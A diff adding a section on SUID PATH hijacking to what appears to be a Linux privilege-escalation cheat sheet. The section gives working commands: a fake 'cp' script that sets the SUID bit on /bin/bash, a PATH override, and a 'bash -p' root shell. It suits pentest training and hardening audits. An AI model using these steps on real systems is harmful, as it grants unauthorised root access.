@@ -646,6 +646,52 @@ strace /path/to/suid_binary 2>&1 | grep -iE 'exec|open|read'
 strace /path/to/suid_binary 2>&1 | grep -E 'execve|openat|stat'
 ```
 
+If you see a command like `cp`, `cat`, or `ls` appear in the output without a full path (e.g. `cp` instead of `/bin/cp`), the binary is vulnerable to PATH hijacking. See the next section.
+
+### PATH Hijacking — SUID Binary
+
+If a SUID root binary calls another program without a full path, you can trick it into running your own version of that program instead. Because the binary runs as root, your fake program also runs as root.
+
+**Step 1 — Confirm the binary calls something without a full path.**
+
+Run strace and look for a command name that appears without a `/` in front of it:
+
+```bash
+strace ./suid_binary 2>&1 | grep exec
+# bad:  execve("cp", ...)        ← no full path, vulnerable
+# safe: execve("/bin/cp", ...)   ← full path, not vulnerable
+```
+
+You can also check with `strings`:
+
+```bash
+strings ./suid_binary | grep -v '/' | grep -E '^[a-z]+$'
+```
+
+**Step 2 — Create a malicious version of that program.**
+
+Put it in the directory you're working in. Make it do whatever you need — here it sets the SUID bit on `/bin/bash`:
+
+```bash
+echo -e '#!/bin/bash\nchmod +s /bin/bash' > cp
+chmod +x cp
+```
+
+**Step 3 — Add your directory to the front of PATH and run the binary.**
+
+```bash
+PATH=.:$PATH ./suid_binary
+```
+
+The binary finds your `cp` first. It runs as root, so your script also runs as root.
+
+**Step 4 — Use the SUID bash to get a root shell.**
+
+```bash
+/bin/bash -p
+# euid=0(root)
+```
+
 ### SUID Binary Abuse
 
 ```bash
